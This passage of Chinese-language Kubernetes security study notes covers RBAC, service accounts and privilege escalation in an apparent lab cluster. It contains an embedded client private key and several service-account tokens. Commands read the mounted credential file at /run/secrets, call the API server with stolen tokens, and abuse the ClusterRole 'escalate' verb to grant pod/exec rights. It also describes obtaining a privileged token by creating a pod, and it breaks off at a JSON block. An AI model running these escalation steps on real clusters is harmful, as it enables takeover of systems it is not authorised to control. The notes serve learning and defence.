    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb2dJQkFBS0NBUUVBeFl4RStJK3RKRTJuSGVxYk1xKzVRZmtmelF1ZVBsOUYrQTRybkpWNUhmNXlLMFVTCnV1Y1dNR1pRbkhOVG8wa2tTQlVLRDFGTitzSDR5OU0xOXBSOCtzeHFYbmF1T1B6R3FNWDlvR1VSVVlrdFRQWlgKRlRFb3dvQkh0ME5IMEJ5NWpGdUhiUW1EUTRsZHdLbVU4Y2ZGOGVKVlNPYVM4anZnenJ0MmdOQlZ4NGU2RTVPZwp1QSthMnFxc216MXZRbm4rOGhjbE5yamJ2MlV6bHdEcWplTTU5a0htcUxBL1FUSlFNUXNUY2hkNWVpaGZFTE1nCms5eFI0eDlVcTZuOERSSU1hb25WeTdqQ0FmNTRMeWc3cW9TUUtqOFc1cWhtV0lPVFltRFQ3ZkVhcTFjdlBaMUEKOGQxTXJPSVJWb3FVa1YrRWFRZ1MxclFLYVFaN0FUSWg3cE1LRHdJREFRQUJBb0lCQURqZnJXdXlVYkxGK0hzUQpkQ1lmbVVKNUtzS3B1YUZUWkoySjF0eDUzQ2phZkp3Z2dzZjBoOXJmV2czdzFmK0lxejFsY1VQL3NHZWxPSy9WCjJ3OW1xS1M3L1ZPODcyUFF3cEVNajN5Q0hINVE5QTNZVGpIM3VUaG1IaitReXpnTFRSQXZ1Y21XbDRmMklGdTcKZHZvMC9iUXA2VXZYdGk2dk5vWE9Tc3ZETHk4R1RtNldQbGRIRk4rTmg4WHF2aVdGSGxQYTlCbXhQNU5lOTJpWgpjdlZJeUlOeW4zUzA2NnNRbHdpQ2pzN2h0N3hlOTgyNzE4bjc0MzlHRVM1aEtKNE9OMm1Eam9LWmRaL2cwSWtuCkpYUjV4eGhQSFBoVkgwWGdnckNqSkh0TTVWREpjUWo0NTZ3Z0dHVWpHQnBxa2ZnUUVqRFJEMGtyeHlGZjdlWWwKT1JZaXNlRUNnWUVBelIyNnJadURVOHRZV0swU0k1UmpUMXpxZlhLMUsxTHg4aUd6UTQwU2RpNW5PdHhRc1M1bQpSZVZtZnd6YnFQOVBJVjQvTHpEZmZrbTg5SjNPaVJuRHZPN0daSDBHdVBSbDMwTVo3SlVrVjVHT1p6dmtWUFM0CjVDRUdRR29leGlVT3I4U29OY3ZjbXR6SFVYbTdiZGdiVDg2bGg5OEpCRndHdzBzTmNZUHFHOXNDZ1lFQTlvM28KWjQ3aEdqSVR3dnBZbkpoL21HVThMWHVMRkg0TjFwcGIvSEcwVFUxZjNuRm9uUCtVMFQyc1ozQmFLOHA3bnF2VwpKM2lKc2kzWnhGZWlsZmRrWVJJNEJLQkVMNjB0SWpQNFp1bjRCbXZIQjJDMTltNHBIQnZocEwxK2F1cDhXMmM4Ci84cXFuTXNDaHdUOUFYVWdybUI4czFDOW9vQXRKeWhYMHRWcVd0MENnWUFncy9tOGprdnRBMEhOdWFKbnU5UHQKcG1IWXFINU1Md2hXVTVzeVRQN0JpdnA0ZndINmpleE9mcG5ON2Uzanp2ajkxL240K3pEWEFNaTRzNlJuWlkwNAp4VlVxVm1qSSttWjNwMG90MTBXWkZLTUF3S0xTRE1haDBNWWZaUXdOQ1lHQzhyYmpCT0xpYWdyNWFaQkJuakFVCmxGeitBY2g5UW5MdGxqekplWC9NK3dLQmdEeHNLS0dBYllBYTk2Ylg3WEZyR2hJQjlVNThNV2h6UC9idzIwd3gKbldzNFpCOUNrYzJ3QVF1S1hyNzIxTkpZakJVbHJaVDh3Rm9QVElnR3BneTBsVUFJMC91bVB5K2o5Q1Ntc2VDZQp4QzdtcU44US8yY0dOa0x5UGtrK08wWCtjejEvUG42OWJ6Ui90LzNZNWh3K1ZTVUc5bWlIaUFIVUFielA4VDMxCkdWeHRBb0dBZVhTNEZBVjVlTm0vTEV3NWZmK3hVVjA4R0E3VVV0UXNLV1dlVVlucVJzbjVQV1ppUEhlNGwzZUwKQnRhb0xFQnV5Rk9RUWRuNjRFTzBMRW10MjRFOFlzY09mMWVkQzlkOWdSZExDQlBNWllNK3Vnc0t4ellZaG9MeQpHUzNoWmRqWiswaDduVzBNazJaRkdZRjJheGswM3htcncxcGlVeG9mcU9XQldXdzc5bUk9Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==
    
    
[root@master test]# echo LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJVVlWTUFtQW96dVV3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpBM01URXdOekF4TVRKYUZ3MHlOREEzTVRBd056QXhNVFJhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXhZeEUrSSt0SkUybkhlcWIKTXErNVFma2Z6UXVlUGw5RitBNHJuSlY1SGY1eUswVVN1dWNXTUdaUW5ITlRvMGtrU0JVS0QxRk4rc0g0eTlNMQo5cFI4K3N4cVhuYXVPUHpHcU1YOW9HVVJVWWt0VFBaWEZURW93b0JIdDBOSDBCeTVqRnVIYlFtRFE0bGR3S21VCjhjZkY4ZUpWU09hUzhqdmd6cnQyZ05CVng0ZTZFNU9ndUErYTJxcXNtejF2UW5uKzhoY2xOcmpidjJVemx3RHEKamVNNTlrSG1xTEEvUVRKUU1Rc1RjaGQ1ZWloZkVMTWdrOXhSNHg5VXE2bjhEUklNYW9uVnk3akNBZjU0THlnNwpxb1NRS2o4VzVxaG1XSU9UWW1EVDdmRWFxMWN2UFoxQThkMU1yT0lSVm9xVWtWK0VhUWdTMXJRS2FRWjdBVEloCjdwTUtEd0lEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JTdmhzQjlUTlIxL09FQTNWY3djTXg0bVBQYwp4akFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBZUIwVzNoNXVyd0JUaDIvblQyTDhrNmxDQlRrbHFqN0RuUXNTCllXSm5rb3dFb0xBOWllSnM2azdPMllDTWRhTWdMZXVkQ3V0K2xaYVhJQ0Z0WUVmZTFnWkM4bzFCN2tacHBnamkKUU00SjRYeHZQZWltenpSZ1MwL3FBd1BHQ0NhMXd2K0x3dVJ6QVNLdkxQMXczNGlZWHJEYTZFRUJURkpNSmJDbwp1YWJUc2l5cmY4bWJDcEY0N2ZqQlZpRmhHTWlldzFJcXlOUEUvaEV2amVXYlNzUkhySjlZNDAraDlXWE5aTGp5CnVaK3FRby9YTGNCWFZmWTVZWmVmT0dsNXRMdGREWDd5ZWI0UGVlNjFvZnF4MkF3elZJeG8raEgxdm1WNkwzcFkKWFNtdElaMEFtdUNTNmY4RTQ5L3h3M2VKNTZHZnBFU0N5Q2Y0cW1aSGxza010aFNwUEE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg== | base64 --decode > admin.crt


[root@master test]# openssl x509 -in admin.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 5874184862061612773 (0x51854c026028cee5)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=kubernetes
        Validity
            Not Before: Jul 11 07:01:12 2023 GMT
            Not After : Jul 10 07:01:14 2024 GMT
        Subject: O=system:masters, CN=kubernetes-admin
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c5:8c:44:f8:8f:ad:24:4d:a7:1d:ea:9b:32:af:
                    b9:41:f9:1f:cd:0b:9e:3e:5f:45:f8:0e:2b:9c:95:
                    79:1d:fe:72:2b:45:12:ba:e7:16:30:66:50:9c:73:
                    53:a3:49:24:48:15:0a:0f:51:4d:fa:c1:f8:cb:d3:
                    35:f6:94:7c:fa:cc:6a:5e:76:ae:38:fc:c6:a8:c5:
                    fd:a0:65:11:51:89:2d:4c:f6:57:15:31:28:c2:80:
                    47:b7:43:47:d0:1c:b9:8c:5b:87:6d:09:83:43:89:
                    5d:c0:a9:94:f1:c7:c5:f1:e2:55:48:e6:92:f2:3b:
                    e0:ce:bb:76:80:d0:55:c7:87:ba:13:93:a0:b8:0f:
                    9a:da:aa:ac:9b:3d:6f:42:79:fe:f2:17:25:36:b8:
                    db:bf:65:33:97:00:ea:8d:e3:39:f6:41:e6:a8:b0:
                    3f:41:32:50:31:0b:13:72:17:79:7a:28:5f:10:b3:
                    20:93:dc:51:e3:1f:54:ab:a9:fc:0d:12:0c:6a:89:
                    d5:cb:b8:c2:01:fe:78:2f:28:3b:aa:84:90:2a:3f:
                    16:e6:a8:66:58:83:93:62:60:d3:ed:f1:1a:ab:57:
                    2f:3d:9d:40:f1:dd:4c:ac:e2:11:56:8a:94:91:5f:
                    84:69:08:12:d6:b4:0a:69:06:7b:01:32:21:ee:93:
                    0a:0f
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier:
                keyid:AF:86:C0:7D:4C:D4:75:FC:E1:00:DD:57:30:70:CC:78:98:F3:DC:C6

    Signature Algorithm: sha256WithRSAEncryption
         78:1d:16:de:1e:6e:af:00:53:87:6f:e7:4f:62:fc:93:a9:42:
         05:39:25:aa:3e:c3:9d:0b:12:61:62:67:92:8c:04:a0:b0:3d:
         89:e2:6c:ea:4e:ce:d9:80:8c:75:a3:20:2d:eb:9d:0a:eb:7e:
         95:96:97:20:21:6d:60:47:de:d6:06:42:f2:8d:41:ee:46:69:
         a6:08:e2:40:ce:09:e1:7c:6f:3d:e8:a6:cf:34:60:4b:4f:ea:
         03:03:c6:08:26:b5:c2:ff:8b:c2:e4:73:01:22:af:2c:fd:70:
         df:88:98:5e:b0:da:e8:41:01:4c:52:4c:25:b0:a8:b9:a6:d3:
         b2:2c:ab:7f:c9:9b:0a:91:78:ed:f8:c1:56:21:61:18:c8:9e:
         c3:52:2a:c8:d3:c4:fe:11:2f:8d:e5:9b:4a:c4:47:ac:9f:58:
         e3:4f:a1:f5:65:cd:64:b8:f2:b9:9f:aa:42:8f:d7:2d:c0:57:
         55:f6:39:61:97:9f:38:69:79:b4:bb:5d:0d:7e:f2:79:be:0f:
         79:ee:b5:a1:fa:b1:d8:0c:33:54:8c:68:fa:11:f5:be:65:7a:
         2f:7a:58:5d:29:ad:21:9d:00:9a:e0:92:e9:ff:04:e3:df:f1:
         c3:77:89:e7:a1:9f:a4:44:82:c8:27:f8:aa:66:47:96:c9:0c:
         b6:14:a9:3c

```

 `system:masters` 绑定的ClusterRole为cluster-admin 

```
[root@master test]# kubectl get clusterrolebinding -A -o yaml | grep system:masters
    name: system:masters

- apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    annotations:
      rbac.authorization.kubernetes.io/autoupdate: "true"
    creationTimestamp: "2023-07-11T07:01:20Z"
    labels:
      kubernetes.io/bootstrapping: rbac-defaults
    name: cluster-admin
    resourceVersion: "149"
    uid: a855e286-88f5-43ff-bf55-9d74adc7379a
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: cluster-admin
  subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: Group
    name: system:masters

[root@master test]# kubectl get rolebinding -A -o yaml | grep system:masters
[root@master test]#

```



对应的权限：

```
[root@master test]# kubectl describe  ClusterRole/cluster-admin
Name:         cluster-admin
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
PolicyRule:
  Resources  Non-Resource URLs  Resource Names  Verbs
  ---------  -----------------  --------------  -----
  *.*        []                 []              [*]
             [*]                []              [*]

```

### 2.7. service account

#### 2.7.1. 概述sa

sa通常使用者是pod ，默认每个pod会自动挂载sa凭证，可用于访问apiserver

服务账号被身份认证后，所确定的用户名为 `system:serviceaccount:<名字空间>:<服务账号>`， 并被分配到用户组 `system:serviceaccounts` 和 `system:serviceaccounts:<名字空间>` https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/authentication/

Service Account包含了namespace、token 和 ca三部分内容，通过base64编码保存于对应的 secret 中。namespace 指定了Pod所属的namespace，ca用于生成和验证 token，token用作身份验证。三者都通过mount的方式挂载在pod文件系统的目录 /var/run/secrets/kubernetes.io/serviceaccount/下 https://cloudnative.to/blog/authentication-k8s/

在 1.6 以上版本中，您可以选择取消为 service account 自动挂载 API 凭证，只需在 service account 中设置 `automountServiceAccountToken: false`

https://jimmysong.io/kubernetes-handbook/guide/configure-pod-service-account.html

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: build-robot
automountServiceAccountToken: false
```

#### 2.7.2. sa相关操作

下面流程中我们绑定service account到role，从这个流程学习sa相关操作，并且程可以了解到，对于role来说 sa user group都是一样的。

创建namespace

```
apiVersion: v1
kind: Namespace
metadata:
  name: minio
```

创建service account

```
apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: minio
  name: service-minio

```

查看所有sa

```
[root@master test]# kubectl get sa -A
NAMESPACE         NAME                                 SECRETS   AGE
default           default                              1         9d
kube-flannel      default                              1         3d22h
...
minio             default                              1         46h
minio             service-minio                        1         46h
```

查看token

```
[root@master test]# kubectl describe sa service-minio -n minio
Name:                service-minio
Namespace:           minio
Labels:              <none>
Annotations:         <none>
Image pull secrets:  <none>
Mountable secrets:   service-minio-token-2rzzv
Tokens:              service-minio-token-2rzzv
Events:              <none>
[root@master test]# kubectl describe secret service-minio-token-2rzzv -n minio
Name:         service-minio-token-2rzzv
Namespace:    minio
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: service-minio
              kubernetes.io/service-account.uid: 80608fb8-4d27-4899-bbd7-a901f5182bec

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1099 bytes
namespace:  5 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IndWRWJ5UklGa0RNdEtBaEgzd3BEdHUzZlZVZEdFYkk1UzRhbW9laDdKcmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJtaW5pbyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJzZXJ2aWNlLW1pbmlvLXRva2VuLTJyenp2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNlcnZpY2UtbWluaW8iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI4MDYwOGZiOC00ZDI3LTQ4OTktYmJkNy1hOTAxZjUxODJiZWMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6bWluaW86c2VydmljZS1taW5pbyJ9.c9yhdOiCXtF4dlUCO3GJ_7MXR8Amb6jO6XoWvxw9ApYK37Aozp49B-PZc9_XLHaiHJXXKqu2MYO1in_E5cdli3L8TpXC-DddGY6JQ81k9zosq8u4WtmCbuWmn4-mmGe4JTfYxeMv9Kd1IVjYfXI593etkDDgxbLh5050cw7Qq5mgUI6YyXkqZUUM2VYu7OpTGYSPtZTq9QDvVyWH1G8epF7kwJJkeSW_YMIzajr1w84cJy4lAEY0Pkgngr-1dqVAZHZeSra7h9pB-VXJcYYcJ-R_gGuDlow3S6Bb5Sy0znYJcaYVes-bDLPwBXXlnSTSW0OEloeXiQ4pKUxStuaDmg

```

创建role

```
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  # 限定可访问的命名空间为 minio
  namespace: minio
  # 角色名称
  name: role-minio-service-minio

# 控制 dashboard 中 命名空间模块 中的面板是否有权限查看
rules:
- apiGroups: [""] # 空字符串""表明使用core API group
  #resources: ["pods","pods/log","pods/exec", "pods/attach", "pods/status", "events", "replicationcontrollers", "services", "configmaps", "persistentvolumeclaims"]
  resources: ["namespaces","pods","pods/log","pods/exec", "pods/attach", "pods/status","services"]
  verbs: ["get", "watch", "list", "create", "update", "patch", "delete"]

- apiGroups: [ "apps"]
  resources: ["deployments", "daemonsets", "statefulsets","replicasets"]
  verbs: ["get", "list", "watch"]

```

绑定role与serviceaccount

```
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: minio
  name: role-bind-minio-service-monio

subjects:
- kind: ServiceAccount
  namespace: minio
  name: service-minio

roleRef:
  kind: Role
  name: role-minio-service-minio
  apiGroup: rbac.authorization.k8s.io
```

查看结果

```
[root@master test]# kubectl get rolebinding -A
NAMESPACE     NAME                                                ROLE                                                  AGE
kube-public   kubeadm:bootstrap-signer-clusterinfo                Role/kubeadm:bootstrap-signer-clusterinfo             7d1h
kube-public   system:controller:bootstrap-signer                  Role/system:controller:bootstrap-signer               7d1h
kube-system   kube-proxy                                          Role/kube-proxy                                       7d1h
kube-system   kubeadm:kubelet-config-1.23                         Role/kubeadm:kubelet-config-1.23                      7d1h
kube-system   kubeadm:nodes-kubeadm-config                        Role/kubeadm:nodes-kubeadm-config                     7d1h
kube-system   system::extension-apiserver-authentication-reader   Role/extension-apiserver-authentication-reader        7d1h
kube-system   system::leader-locking-kube-controller-manager      Role/system::leader-locking-kube-controller-manager   7d1h
kube-system   system::leader-locking-kube-scheduler               Role/system::leader-locking-kube-scheduler            7d1h
kube-system   system:controller:bootstrap-signer                  Role/system:controller:bootstrap-signer               7d1h
kube-system   system:controller:cloud-provider                    Role/system:controller:cloud-provider                 7d1h
kube-system   system:controller:token-cleaner                     Role/system:controller:token-cleaner                  7d1h
minio         role-bind-minio-service-monio                       Role/role-minio-service-minio                         21s

```

为kube-system空间下的default绑定role

```
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: kube-system
  name: role-bind-test

subjects:
- kind: ServiceAccount
  namespace: kube-system
  name: default

roleRef:
  kind: Role
  name: role-minio-service-minio
  apiGroup: rbac.authorization.k8s.io
```

查询出来的name为 role-bind-test ，需要再进一步查看配置了解绑定详情

```
[root@master test]# kubectl get rolebinding -A
NAMESPACE     NAME                                                ROLE                                                  AGE
kube-public   kubeadm:bootstrap-signer-clusterinfo                Role/kubeadm:bootstrap-signer-clusterinfo             7d1h
kube-public   system:controller:bootstrap-signer                  Role/system:controller:bootstrap-signer               7d1h
kube-system   kube-proxy                                          Role/kube-proxy                                       7d1h
kube-system   kubeadm:kubelet-config-1.23                         Role/kubeadm:kubelet-config-1.23                      7d1h
kube-system   kubeadm:nodes-kubeadm-config                        Role/kubeadm:nodes-kubeadm-config                     7d1h
kube-system   role-bind-test                                      Role/role-minio-service-minio                         26s
kube-system   system::extension-apiserver-authentication-reader   Role/extension-apiserver-authentication-reader        7d1h
kube-system   system::leader-locking-kube-controller-manager      Role/system::leader-locking-kube-controller-manager   7d1h
kube-system   system::leader-locking-kube-scheduler               Role/system::leader-locking-kube-scheduler            7d1h
kube-system   system:controller:bootstrap-signer                  Role/system:controller:bootstrap-signer               7d1h
kube-system   system:controller:cloud-provider                    Role/system:controller:cloud-provider                 7d1h
kube-system   system:controller:token-cleaner                     Role/system:controller:token-cleaner                  7d1h
minio         role-bind-minio-service-monio                       Role/role-minio-service-minio                         30m

[root@master test]# kubectl get rolebinding role-bind-test -o yaml -n kube-system
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"rbac.authorization.k8s.io/v1","kind":"RoleBinding","metadata":{"annotations":{},"name":"role-bind-test","namespace":"kube-system"},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"Role","name":"role-minio-service-minio"},"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"kube-system"}]}
  creationTimestamp: "2023-07-18T08:46:09Z"
  name: role-bind-test
  namespace: kube-system
  resourceVersion: "95749"
  uid: a000221d-f6c4-414e-ad8d-6c2772779fb3
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: role-minio-service-minio
subjects:
- kind: ServiceAccount
  name: default
  namespace: kube-system
```

```
[root@master test]# kubectl create serviceaccount service-minio2 -n minio
serviceaccount/service-minio2 created
[root@master test]# kubectl describe serviceaccount service-minio2 -n minio
Name:                service-minio2
Namespace:           minio
Labels:              <none>
Annotations:         <none>
Image pull secrets:  <none>
Mountable secrets:   service-minio2-token-q5jg5
Tokens:              service-minio2-token-q5jg5
Events:              <none>


```

因为我们在使用 serviceaccount 账号配置 kubeconfig 的时候需要使用到sa 的 token， 该 token 保存在该 serviceaccount 保存的 secret 中

```
[root@master test]# kubectl get secret service-minio2-token-q5jg5 -n minio -o yaml
apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1EY3hNVEEzTURFeE1sb1hEVE16TURjd09EQTNNREV4TWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTHhyCk5ERDJpNVArYXhYSmpTY2JLRk03M21mbFFhRE91RXA3cG5TQ3dMRTJmd29kUkZHK2VBU1Q3L1NjWlZTRVZ5N3cKK0cxTHovS0hyTmd4STIyd1hhTnV1SGRmNkNxMllmMnQwRVZOTUdKZU03bytTUUQ3Tmxxb0pWa1ZSSm9CdVVPbQpjdlBoN3V5YmZucjFkb29KNzdwQkhKNElOOTM0dDZPeHJ6T1ladUV3R2t1amJjcDV3OWV0NkdhUFgvUXRLdjk3Ci8vUExZYUdPMWRMSkFjbXU3RndjcTh4Mm5nc3dvcmE0Mi96bklMRW1xbTdwSGhNQURncVd0MHBnSWRDY1IweWMKUEN6cDV2ZWhLTzdHaWFXdFQvS0IxNEtsQjNOVnpmYlZmWXRMYStKVVNGbEhaTVIxMlBuYmtCY2l4V2VhbUNJNAovc0tsVDRBdlpkbWRFeHp0THhjQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZLK0d3SDFNMUhYODRRRGRWekJ3ekhpWTg5ekdNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR0xHSmRpa3pFeUhoM1dkNHBRTQp4L3ZOTzFBMmRnUkM0S0tPNk82VXo2d0s0b3p4RmZqMzFjV2dkanFzcmx2R2NiS0RVcWxwSE5aWnlJZ1NMVVVlCi9EdStuMDRWMkRBQzBlUFlQQXlQRWNUcXBIeFA4R0M0VWMwSWE0dURIUGtJdGlPT2pSMFUwRzlzMXlRaGNabzIKTzRKdTdoY1NvU05wVlpSQUdqK0RlMldNNmluSFVFMVlIQ05SNFgyei85VldCbGVGYjNUeVBGbmZqUjQyWU40OQp6TFZTMWhNSzVkQjJJWWNNNTBaMDN2MkJyQktsZ1pvcW9DOVhSdEw2NjBxYnFHc2R0K1hCOE1FOFZSOGNtMXRaCjU4NFJ0TmtZNkUrbGpXemZHZ04rWFFrNHk0YXdjTWgwNVJaYkhQNEJBckhQYWowaEVFTXE4a0taaitoMEozOTMKUk84PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
  namespace: bWluaW8=
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluZFdSV0o1VWtsR2EwUk5kRXRCYUVnemQzQkVkSFV6WmxaVlpFZEZZa2sxVXpSaGJXOWxhRGRLY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUp0YVc1cGJ5SXNJbXQxWW1WeWJtVjBaWE11YVc4dmMyVnlkbWxqWldGalkyOTFiblF2YzJWamNtVjBMbTVoYldVaU9pSnpaWEoyYVdObExXMXBibWx2TWkxMGIydGxiaTF4Tldwbk5TSXNJbXQxWW1WeWJtVjBaWE11YVc4dmMyVnlkbWxqWldGalkyOTFiblF2YzJWeWRtbGpaUzFoWTJOdmRXNTBMbTVoYldVaU9pSnpaWEoyYVdObExXMXBibWx2TWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExuVnBaQ0k2SW1Jd016WXdZVEZrTFdNNVl6VXRORFl4WVMxaE1UTTFMV1UwTUdGa1kyTTJZVEF3WWlJc0luTjFZaUk2SW5ONWMzUmxiVHB6WlhKMmFXTmxZV05qYjNWdWREcHRhVzVwYnpwelpYSjJhV05sTFcxcGJtbHZNaUo5LnpiUFppX2VNWlZuZG5oYkprWGVLMjQxVE1UZXR3QmpQc0pFdHFXMWY5Y09HeENRNHo3aHNkSnp4WlNNQVZjdWtKZWE2NjhWM0t0U2tuelMyTUF0aU5oOENWdVVwZ1lWQk5HckluYjhHS1VJdE5jb0tOMHhOZGxXYVlQXy1BY0xHUHE2TUVRYmNXWEhKcll3elNlT3dJeWlwcldZUGxFVV83anBsc2s1QU1WcHpMYklFWEZJalJFMU0zVWY4MFFpajd0MmduMXoya25ZRExLNzFqU2MyR3IxM0lCaFoyeEVCQUVXNEJjTnZJRDNTc0lvd19ob3N1RVIyRWpQbEZmSlpWR19WemNTcHR0ekFFTU9Vbm9ndGFCNlFheTQ3Sjk4ODBKb1VaRGJGbkRGeFRhaUF4NmMyekdtU3FUOVZoZndJOUw2aTFvREYyTTRhblNOZHFNRlI3QQ==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: service-minio2
    kubernetes.io/service-account.uid: b0360a1d-c9c5-461a-a135-e40adcc6a00b
  creationTimestamp: "2023-07-20T08:27:56Z"
  name: service-minio2-token-q5jg5
  namespace: minio
  resourceVersion: "297827"
  uid: d9325fa7-d344-4020-8662-fa6c12fe51e6
type: kubernetes.io/service-account-token

```

#### 2.7.3. 使用sa token

k8s默认会为pod挂载 sa ，默认路径以及使用方法如下：

```
root@nginx:/# cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IndWRWJ5UklGa0RNdEtBaEgzd3BEdHUzZlZVZEdFYkk1UzRhbW9laDdKcmsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwi....
```

```
curl --header "Authorization: Bearer eyJhbGc..." -X GET https://192.168.128.129:6443/api/v1/componentstatuses --insecure
```

```
./kubectl -s https://192.168.128.129:6443 --insecure-skip-tls-verify=true --token eyJhbGc... get node
```

## 3. 提权

### 3.1. 提权思路

kubectl auth can-i --list

![class_power](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/class_power.png)



### 3.2. demo: update clusterrole

比如，我们从etcd拿到一个有clusterrole修改权限的token，默认无法操作集群pod等资源，但是有clusterrole修改权限：

```
#kubectl describe clusterrole system:controller:clusterrole-aggregation-controller
Name:         system:controller:clusterrole-aggregation-controller
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
PolicyRule:
  Resources                               Non-Resource URLs  Resource Names  Verbs
  ---------                               -----------------  --------------  -----
  clusterroles.rbac.authorization.k8s.io  []                 []              [escalate get list patch update watch]

```

我们通过edit该sa，并添加相关权限

```
./kubectl -s https://192.168.128.129:6443 --insecure-skip-tls-verify=true --token ... edit clusterrole system:controller:clusterrole-aggregation-controller
```

```
- apiGroups:
  - ""
  resources:
  - namespaces
  - pods
  - pods/log
  - pods/exec
  - pods/attach
  - pods/status
  - services
  verbs:
  - get
  - watch
  - list
  - create
  - update
  - patch
  - delete

```

成功提升权限：

```
Name:         system:controller:clusterrole-aggregation-controller
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
PolicyRule:
  Resources                               Non-Resource URLs  Resource Names  Verbs
  ---------                               -----------------  --------------  -----
  clusterroles.rbac.authorization.k8s.io  []                 []              [escalate get list patch update watch]
  namespaces                              []                 []              [get watch list create update patch delete]
  pods/attach                             []                 []              [get watch list create update patch delete]
  pods/exec                               []                 []              [get watch list create update patch delete]
  pods/log                                []                 []              [get watch list create update patch delete]
  pods/status                             []                 []              [get watch list create update patch delete]
  pods                                    []                 []              [get watch list create update patch delete]
  services                                []                 []              [get watch list create update patch delete]

```

### 3.3. create pod

https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token

如果我们的token有创建pod的权限，但不是高权限账号，我们可以通过该机制获取指定sa的token：pod的配置文件指定serviceAccountName，k8s在启动pod后会自动挂载该sa的token

当然，我们在使用时还需要知道或能猜测到高权限账户的名称。

```json
//https://github.com/cdk-team/CDK/blob/main/pkg/exploit/k8s_get_sa_token.go
{
